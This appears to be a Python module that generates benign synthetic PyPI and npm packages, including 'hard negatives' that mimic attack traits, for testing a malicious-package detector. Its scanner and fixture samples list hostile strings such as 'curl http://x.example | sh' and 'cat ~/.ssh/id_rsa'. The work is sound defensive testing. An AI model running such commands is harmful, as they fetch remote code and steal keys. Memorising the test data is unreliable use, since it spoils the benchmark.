"""Benign synthetic packages, including HARD NEGATIVES: legitimate code that superficially
resembles attack behaviour. A detector that only ever sees clean toy libraries will report a
flattering false-positive rate that means nothing, so a good share of these are deliberately
the sort of thing that trips naive scanners.
"""

from __future__ import annotations

from .samples import fill, new_name, npm_files, pypi_files

PNG_1X1 = ("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==")
NSPKG_PTH = ("import sys, types, os;has_mfs = sys.version_info > (3, 5);p = os.path.join(sys._getframe(1).f_locals['sitedir'], "
             "*('ns',));importlib = has_mfs and __import__('importlib.util');has_mfs and __import__('importlib.machinery');"
             "m = has_mfs and sys.modules.setdefault('ns', importlib.util.module_from_spec(importlib.machinery.PathFinder."
             "find_spec('ns', [os.path.dirname(p)])));m = m or sys.modules.setdefault('ns', types.ModuleType('ns'));"
             "mp = (m or []) and m.__dict__.setdefault('__path__',[]);(p not in mp) and mp.append(p)\n")


def _py(rng, used, files_fn, version="1.0.0"):
    name = new_name(rng, used)
    pkg = name.replace("-", "_")
    return name, "pypi", version, pypi_files(name, version, files_fn(name, pkg))


# ---------------------------------------------------------------------------- python
def plain_math(rng, i, used):
    return _py(rng, used, lambda n, p: {f"{p}/__init__.py": '"""Tiny math helpers."""\n\n\ndef clamp(x, lo, hi):\n    return max(lo, min(hi, x))\n\n\ndef mean(xs):\n    xs = list(xs)\n    return sum(xs) / len(xs)\n'})


def b64_utils(rng, i, used):
    return _py(rng, used, lambda n, p: {f"{p}/__init__.py": 'import base64\nimport hashlib\n\n\ndef encode(data: bytes) -> str:\n    return base64.b64encode(data).decode("ascii")\n\n\ndef decode(text: str) -> bytes:\n    return base64.b64decode(text)\n\n\ndef digest(data: bytes) -> str:\n    return hashlib.sha256(data).hexdigest()\n'})


def http_client(rng, i, used):
    return _py(rng, used, lambda n, p: {f"{p}/__init__.py": 'import requests\n\n\ndef get_json(url):\n    r = requests.get(url, timeout=10)\n    r.raise_for_status()\n    return r.json()\n'})


def env_config(rng, i, used):
    return _py(rng, used, lambda n, p: {f"{p}/__init__.py": 'import os\n\nimport requests\n\n\ndef send(payload):\n    url = os.environ.get("MYAPP_URL", "https://api.myapp.example/v1/events")\n    token = os.getenv("MYAPP_TOKEN")\n    return requests.post(url, json=payload, headers={"Authorization": "Bearer " + str(token)}, timeout=10)\n'})


def expr_eval(rng, i, used):
    return _py(rng, used, lambda n, p: {f"{p}/__init__.py": 'import ast\n\n\ndef safe_eval(expr):\n    tree = ast.parse(expr, mode="eval")\n    return eval(compile(tree, "<expr>", "eval"), {"__builtins__": {}}, {})\n'})


def proc_runner(rng, i, used):
    return _py(rng, used, lambda n, p: {f"{p}/__init__.py": 'import os\nimport subprocess\n\n\ndef git_head(cwd="."):\n    out = subprocess.run(["git", "rev-parse", "HEAD"], cwd=cwd, env=os.environ.copy(), capture_output=True, text=True)\n    return out.stdout.strip()\n'})


def cred_reader(rng, i, used):
    return _py(rng, used, lambda n, p: {
        f"{p}/__init__.py": "from .profile import read_profile  # noqa\nfrom .client import list_buckets  # noqa\n",
        f"{p}/profile.py": 'import configparser\nimport os\n\n\ndef read_profile(name="default"):\n    cp = configparser.ConfigParser()\n    cp.read(os.path.expanduser("~/.aws/credentials"))\n    return dict(cp[name]) if name in cp else {}\n',
        f"{p}/client.py": 'import requests\n\n\ndef list_buckets(endpoint):\n    return requests.get(endpoint + "/buckets", timeout=10).json()\n',
    })


def native_setup(rng, i, used):
    return _py(rng, used, lambda n, p: {
        "setup.py": fill('''import subprocess

from setuptools import Extension, setup
from setuptools.command.build_ext import build_ext


class CMakeBuild(build_ext):
    def run(self):
        subprocess.check_call(["cmake", "--version"])
        super().run()


setup(name="@@N@@", version="1.0.0", packages=["@@P@@"],
      ext_modules=[Extension("@@P@@._native", ["src/native.c"])], cmdclass={"build_ext": CMakeBuild})
''', N=n, P=p),
        f"{p}/__init__.py": "",
        "src/native.c": "int add(int a, int b) { return a + b; }\n",
    })


def readme_setup(rng, i, used):
    return _py(rng, used, lambda n, p: {
        "setup.py": fill('''import re
from pathlib import Path

from setuptools import find_packages, setup

here = Path(__file__).parent
long_description = (here / "README.md").read_text(encoding="utf-8")
version = re.search(r'__version__ = "([^"]+)"', (here / "@@P@@" / "__init__.py").read_text()).group(1)

setup(name="@@N@@", version=version, packages=find_packages(), long_description=long_description)
''', N=n, P=p),
        f"{p}/__init__.py": '__version__ = "1.0.0"\n',
        "README.md": "# readme\n",
    })


def nspkg_pth(rng, i, used):
    name = new_name(rng, used)
    pkg = name.replace("-", "_")
    return name, "pypi", "1.0.0", pypi_files(name, "1.0.0", {f"{pkg}-nspkg.pth": NSPKG_PTH, f"{pkg}/__init__.py": ""}, wheel=True)


def sec_scanner_lib(rng, i, used):
    return _py(rng, used, lambda n, p: {f"{p}/__init__.py": '''import re

import requests

ATTACK_PATTERNS = [
    re.compile(r"curl\\s+[^|]*\\|\\s*sh"),
    re.compile(r"\\.ssh/id_rsa"),
    re.compile(r"os\\.environ"),
]
SENSITIVE_PATHS = ["~/.ssh/id_rsa", "~/.aws/credentials", "~/.npmrc"]


def scan_text(text):
    return [p.pattern for p in ATTACK_PATTERNS if p.search(text)]


def fetch_and_scan(url):
    return scan_text(requests.get(url, timeout=10).text)
'''})


def embedded_asset(rng, i, used):
    return _py(rng, used, lambda n, p: {f"{p}/__init__.py": f'import base64\n\nICON = base64.b64decode("{PNG_1X1}")\n'})


def update_check(rng, i, used):
    return _py(rng, used, lambda n, p: {f"{p}/cli.py": fill('''import subprocess
import sys

import requests


def latest_version(name="@@N@@"):
    return requests.get("https://pypi.org/pypi/" + name + "/json", timeout=5).json()["info"]["version"]


def upgrade(name="@@N@@"):
    subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", name], check=False)
''', N=n), f"{p}/__init__.py": ""})


def plugin_loader(rng, i, used):
    return _py(rng, used, lambda n, p: {f"{p}/__init__.py": 'import importlib\n\n\ndef load(name):\n    mod = importlib.import_module(name)\n    return getattr(mod, "register")()\n'})


def gh_client(rng, i, used):
    return _py(rng, used, lambda n, p: {f"{p}/__init__.py": 'import os\n\nimport requests\n\n\ndef repo(owner, name):\n    headers = {"Authorization": "token " + os.getenv("GITHUB_TOKEN", "")}\n    return requests.get(f"https://api.github.com/repos/{owner}/{name}", headers=headers, timeout=10).json()\n'})


def template_data(rng, i, used):
    return _py(rng, used, lambda n, p: {
        f"{p}/__init__.py": 'import pkgutil\n\n\ndef base_template():\n    return pkgutil.get_data(__name__, "templates/base.html").decode("utf-8")\n',
        f"{p}/templates/base.html": "<html><body>{{ content }}</body></html>\n",
    })


def vendored_build(rng, i, used):
    return _py(rng, used, lambda n, p: {
        "setup.py": fill('''import subprocess
import urllib.request

from setuptools import setup

urllib.request.urlretrieve("https://downloads.vendor.example/zlib-1.3.tar.gz", "zlib.tar.gz")
subprocess.check_call(["tar", "xf", "zlib.tar.gz"])
subprocess.check_call(["make"])
setup(name="@@N@@", version="1.0.0", packages=["@@P@@"])
''', N=n, P=p),
        f"{p}/__init__.py": "",
    })


# ------------------------------------------------------------------------------- npm
def _npm(rng, used, files, **kw):
    name = new_name(rng, used)
    return name, "npm", "1.0.0", npm_files(name, "1.0.0", files, **kw)


def util_lib(rng, i, used):
    return _npm(rng, used, {"index.js": "exports.clamp = (x, lo, hi) => Math.max(lo, Math.min(hi, x));\nexports.sum = (xs) => xs.reduce((a, b) => a + b, 0);\n"})


def postinstall_banner(rng, i, used):
    return _npm(rng, used, {
        "index.js": "module.exports = () => 'ok';\n",
        "scripts/postinstall.js": "if (parseInt(process.versions.node, 10) < 14) { console.warn('Node 14+ recommended'); }\nconsole.log('Thanks for installing!');\n",
    }, scripts={"postinstall": "node scripts/postinstall.js"})


def native_addon(rng, i, used):
    return _npm(rng, used, {"index.js": "module.exports = require('bindings')('addon');\n",
                            "binding.gyp": "{ 'targets': [ { 'target_name': 'addon', 'sources': [ 'addon.cc' ] } ] }\n"},
                scripts={"install": "node-gyp rebuild"})


def husky_prepare(rng, i, used):
    return _npm(rng, used, {"index.js": "module.exports = () => 1;\n"}, scripts={"prepare": "husky install"})


def api_wrapper(rng, i, used):
    return _npm(rng, used, {"index.js": "async function call(path) {\n  const r = await fetch('https://api.service.example' + path, { headers: { 'X-Api-Key': process.env.API_KEY } });\n  return r.json();\n}\nmodule.exports = { call };\n"})


def cli_tool(rng, i, used):
    return _npm(rng, used, {"bin/cli.js": '''#!/usr/bin/env node
const { spawn } = require('child_process');
const https = require('https');

function run(args) {
  return spawn('git', args, { stdio: 'inherit', env: { ...process.env, GIT_TERMINAL_PROMPT: '0' } });
}

function checkForUpdate() {
  https.get('https://registry.npmjs.org/some-cli/latest', (res) => res.resume());
}

checkForUpdate();
run(process.argv.slice(2));
'''}, bin_={"some-cli": "bin/cli.js"})


def sec_fixtures_js(rng, i, used):
    return _npm(rng, used, {"index.js": "const ATTACK_STRINGS = ['curl http://x.example | sh', 'cat ~/.ssh/id_rsa', 'JSON.stringify(process.env)'];\nmodule.exports = (text) => ATTACK_STRINGS.filter((s) => text.includes(s));\n"})


def dyn_require(rng, i, used):
    return _npm(rng, used, {"index.js": "const path = require('path');\nmodule.exports = (name) => require(path.join(__dirname, 'plugins', name));\n"})


# (family, builder, is_hard_negative, samples)
BENIGN_BUILDERS = [
    ("plain_math", plain_math, False, 2),
    ("b64_utils", b64_utils, True, 2),
    ("http_client", http_client, False, 2),
    ("env_config", env_config, False, 2),
    ("expr_eval", expr_eval, True, 2),
    ("proc_runner", proc_runner, True, 2),
    ("cred_reader", cred_reader, True, 2),
    ("native_setup", native_setup, True, 2),
    ("readme_setup", readme_setup, False, 2),
    ("nspkg_pth", nspkg_pth, True, 2),
    ("sec_scanner_lib", sec_scanner_lib, True, 2),
    ("embedded_asset", embedded_asset, True, 2),
    ("update_check", update_check, True, 2),
    ("plugin_loader", plugin_loader, True, 2),
    ("gh_client", gh_client, True, 2),
    ("template_data", template_data, True, 2),
    ("vendored_build", vendored_build, True, 2),
    ("util_lib", util_lib, False, 2),
    ("postinstall_banner", postinstall_banner, True, 2),
    ("native_addon", native_addon, True, 2),
    ("husky_prepare", husky_prepare, True, 2),
    ("api_wrapper", api_wrapper, False, 2),
    ("cli_tool", cli_tool, True, 2),
    ("sec_fixtures_js", sec_fixtures_js, True, 2),
    ("dyn_require", dyn_require, True, 2),
]
